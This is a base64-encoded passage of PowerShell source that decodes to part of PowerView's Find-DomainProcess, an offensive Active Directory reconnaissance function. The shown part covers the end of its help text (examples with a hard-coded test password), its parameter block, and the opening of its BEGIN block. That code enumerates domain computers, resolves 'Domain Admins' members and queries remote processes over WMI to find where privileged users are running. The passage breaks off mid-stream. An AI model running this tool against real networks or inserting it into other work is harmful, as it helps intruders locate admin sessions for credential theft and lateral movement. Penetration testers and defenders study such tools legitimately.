ZmllcyB0aGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2ggZm9yIHRhcmdldCB1c2Vycy4KZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIi4gVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBVc2VyR3JvdXBJZGVudGl0eQoKU3BlY2lmaWVzIGEgZ3JvdXAgaWRlbnRpdHkgdG8gcXVlcnkgZm9yIHRhcmdldCB1c2VycywgZGVmYXVsdHMgdG8gJ0RvbWFpbiBBZG1pbnMuCklmIGFueSBvdGhlciB1c2VyIHNwZWNpZmljYXRpb25zIGFyZSBzZXQsIHRoZW4gVXNlckdyb3VwSWRlbnRpdHkgaXMgaWdub3JlZC4KCi5QQVJBTUVURVIgVXNlckFkbWluQ291bnQKClN3aXRjaC4gU2VhcmNoIGZvciB1c2VycyB1c2VycyB3aXRoICcoYWRtaW5Db3VudD0xKScgKG1lYW5pbmcgYXJlL3dlcmUgcHJpdmlsZWdlZCkuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyIGZvciBjb21wdXRlcnMsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4gYW5kIHRhcmdldCBzeXN0ZW1zLgoKLlBBUkFNRVRFUiBTdG9wT25TdWNjZXNzCgpTd2l0Y2guIFN0b3AgaHVudGluZyBhZnRlciBmaW5kaW5nIGFmdGVyIGZpbmRpbmcgYSB0YXJnZXQgdXNlci4KCi5QQVJBTUVURVIgRGVsYXkKClNwZWNpZmllcyB0aGUgZGVsYXkgKGluIHNlY29uZHMpIGJldHdlZW4gZW51bWVyYXRpbmcgaG9zdHMsIGRlZmF1bHRzIHRvIDAuCgouUEFSQU1FVEVSIEppdHRlcgoKU3BlY2lmaWVzIHRoZSBqaXR0ZXIgKDAtMS4wKSB0byBhcHBseSB0byBhbnkgc3BlY2lmaWVkIC1EZWxheSwgZGVmYXVsdHMgdG8gKy8tIDAuMwoKLlBBUkFNRVRFUiBUaHJlYWRzCgpUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGZvciB1c2VyIHNlYXJjaGluZywgZGVmYXVsdHMgdG8gMjAuCgouRVhBTVBMRQoKRmluZC1Eb21haW5Qcm9jZXNzCgpTZWFyY2hlcyBmb3IgcHJvY2Vzc2VzIHJ1biBieSAnRG9tYWluIEFkbWlucycgYnkgZW51bWVyYXRpbmcgZXZlcnkgY29tcHV0ZXIgaW4gdGhlIGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLURvbWFpblByb2Nlc3MgLVVzZXJBZG1pbkNvdW50IC1Db21wdXRlck9wZXJhdGluZ1N5c3RlbSAnV2luZG93cyA3KicgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKRW51bWVyYXRlcyBXaW5kb3dzIDcgY29tcHV0ZXJzIGluIGRldi50ZXN0bGFiLmxvY2FsIGFuZCByZXR1cm5zIGFueSBwcm9jZXNzZXMgYmVpbmcgcnVuIGJ5CnByaXZpbGVnZWQgdXNlcnMgaW4gZGV2LnRlc3RsYWIubG9jYWwuCgouRVhBTVBMRQoKRmluZC1Eb21haW5Qcm9jZXNzIC1Qcm9jZXNzTmFtZSBwdXR0eS5leGUKClNlYXJjaGluZ3MgZm9yIGluc3RhbmNlcyBvZiBwdXR0eS5leGUgcnVubmluZyBvbiB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1Eb21haW5Qcm9jZXNzIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKU2VhcmNoZXMgcHJvY2Vzc2VzIGJlaW5nIHJ1biBieSAnZG9tYWluIGFkbWlucycgaW4gdGhlIHRlc3RsYWIubG9jYWwgdXNpbmcgdGhlIHNwZWNpZmllZCBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LlVzZXJQcm9jZXNzCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVBTQ3JlZGVudGlhbFR5cGUnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNBdm9pZFVzaW5nUGxhaW5UZXh0Rm9yUGFzc3dvcmQnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlVzZXJQcm9jZXNzJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdOb25lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlYXJjaEJhc2UsCgogICAgICAgIFtBbGlhcygnVW5jb25zdHJhaW5lZCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENvbXB1dGVyVW5jb25zdHJhaW5lZCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ09wZXJhdGluZ1N5c3RlbScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVGFyZ2V0UHJvY2VzcycpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9jZXNzTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFVzZXInKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVXNlcklkZW50aXR5JyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFVzZXInKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdUYXJnZXRVc2VyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTERBUEZpbHRlciwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFVzZXInKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnR3JvdXBOYW1lJywgJ0dyb3VwJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VyR3JvdXBJZGVudGl0eSA9ICdEb21haW4gQWRtaW5zJywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFVzZXInKV0KICAgICAgICBbQWxpYXMoJ0FkbWluQ291bnQnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VyQWRtaW5Db3VudCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0KICAgICAgICBbRG91YmxlXQogICAgICAgICRKaXR0ZXIgPSAuMywKCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVW5jb25zdHJhaW5lZCddID0gJFVuY29uc3RyYWluZWQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZXJ2aWNlUGFjayddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2aWNlUGFjayddID0gJFNlcnZpY2VQYWNrIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNpdGVOYW1lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NpdGVOYW1lJ10gPSAkU2l0ZU5hbWUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkVXNlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFVzZXJJZGVudGl0eSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyRG9tYWluJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckxEQVBGaWx0ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkVXNlckxEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJTZWFyY2hCYXNlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyQWRtaW5Db3VudCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0FkbWluQ291bnQnXSA9ICRVc2VyQWRtaW5Db3VudCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgoKICAgICAgICAjIGZpcnN0LCBidWlsZCB0aGUgc2V0IG9mIGNvbXB1dGVycyB0byBlbnVtZXJhdGUKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck5hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0ZpbmQtRG9tYWluUHJvY2Vzc10gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4nCiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Qcm9jZXNzXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLURvbWFpblByb2Nlc3NdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZScKICAgICAgICB9CgogICAgICAgICMgbm93IGJ1aWxkIHRoZSB1c2VyIHRhcmdldCBzZXQKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRQcm9jZXNzTmFtZSA9IEAoKQogICAgICAgICAgICBGb3JFYWNoICgkVCBpbiAkUHJvY2Vzc05hbWUpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRQcm9jZXNzTmFtZSArPSAkVC5TcGxpdCgnLCcpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUYXJnZXRQcm9jZXNzTmFtZSAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsKICAgICAgICAgICAgICAgICRUYXJnZXRQcm9jZXNzTmFtZSA9IFtTdHJpbmdbXV0gQCgkVGFyZ2V0UHJvY2Vzc05hbWUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJJZGVudGl0eSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyQWRtaW5Db3VudCddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBbGxvd0RlbGVnYXRpb24nXSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgc2FtYWNjb3VudG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkVXNlckdyb3VwSWRlbnRpdHkKICAgICAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIEBHcm91cFNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWVtYmVyTmFtZQogICAgICAgIH0KCiAgICAgICAgIyB0aGUgaG9zdCBlbnVtZXJhdGlvbiBibG9jayB3ZSdyZSB1c2luZyB0byBlbnVtZXJhdGUgYWxsIHNlcnZlcnMKICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFByb2Nlc3NOYW1lLCAkVGFyZ2V0VXNlcnMsICRDcmVkZW50aWFsKQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAjIHRyeSB0byBlbnVtZXJhdGUgYWxsIGFjdGl2ZSBwcm9jZXNzZXMgb24gdGhlIHJlbW90ZSBob3N0CiAgICAgICAgICAgICAgICAgICAgIyBhbmQgc2VhcmNoIGZvciBhIHNwZWNpZmljIHByb2Nlc3MgbmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkQ3JlZGVudGlhbCkgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2Vzc2VzID0gR2V0LVdNSVByb2Nlc3MgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzZXMgPSBHZXQtV01JUHJvY2VzcyAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlciAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkUHJvY2VzcyBpbiAkUHJvY2Vzc2VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgd2UncmUgaHVudGluZyBmb3IgYSBwcm9jZXNzIG5hbWUgb3IgY29tbWEtc2VwYXJhdGVkIG5hbWVzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUHJvY2Vzc05hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUHJvY2Vzc05hbWUgLUNvbnRhaW5zICRQcm9jZXNzLlByb2Nlc3NOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KIC